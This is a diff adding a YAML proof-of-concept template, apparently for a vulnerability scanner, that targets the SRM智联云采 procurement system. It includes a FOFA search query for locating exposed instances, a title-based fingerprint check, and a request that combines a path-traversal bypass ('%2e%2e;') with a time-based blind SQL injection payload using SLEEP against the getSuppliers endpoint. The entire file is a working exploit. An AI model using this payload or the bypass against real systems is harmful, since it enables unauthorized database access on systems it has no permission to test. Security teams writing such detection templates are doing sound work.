@@ -1,0 +1,21 @@
+id: poc-yaml-srm-zhilink-getsuppliers-sqli
+info:
+  name: SRM智联云采系统 getSuppliers SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: srm
+  fofa: title=="SRM 2.0"
+variables:
+  t1: random_int(2,5)
+  t2: t1 + t1
+  t3: t2 + 2
+requests:
+- method: GET
+  path: /
+  expression: status_code == 200 && contains(title,"SRM 2.0")
+- method: GET
+  path: /adpweb/static/%2e%2e;/a/srm/inquiry/getSuppliers?code=%27+AND+%28SELECT+1312+FROM+%28SELECT%28SLEEP%28{{.t1}}%29%29%29HckV%29--+HyuV
+  expression: status_code == 200 && contains(body,"供应商 - Powered By zhilink") && duration
+    > t2 && duration < t3
+transport: http
